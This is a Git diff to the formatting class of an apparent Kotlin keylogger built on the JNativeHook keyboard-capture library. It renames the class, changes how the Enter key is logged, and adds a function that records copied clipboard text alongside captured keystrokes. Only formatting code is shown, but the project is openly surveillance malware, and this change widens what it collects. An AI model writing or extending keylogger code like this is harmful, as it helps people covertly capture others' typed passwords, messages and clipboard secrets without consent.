@@ -2,9 +2,9 @@ package com.github.secretx33.keylogger
 
 import org.jnativehook.keyboard.NativeKeyEvent
 
-class KeyFormat {
+class LogFormat {
 
-    fun format(
+    fun formatKey(
         keyCode: Int,
         rawKeyCode: Int,
         isShiftPressed: Boolean,
@@ -56,12 +56,13 @@ class KeyFormat {
                 println("Key '$keyCode' is not mapped, saving its code instead!")
                 "[${keyCode}]"
             }
-            keyCode == NativeKeyEvent.VC_ENTER -> "[$keyText]\n"
             keyText.length > 1 || keyText.matches(NON_ASCII_REGEX) -> "[$keyText]"
             isShiftPressed -> keyText.uppercase()
             else -> keyText.lowercase()
         }
     }
+
+    fun formatClipboard(clipboardText: String): String = "\nCopied Text: '$clipboardText'"
 
     private companion object {
         val NON_ASCII_REGEX = """[^\x20-\x7F\xA1-\xFF]""".toRegex()
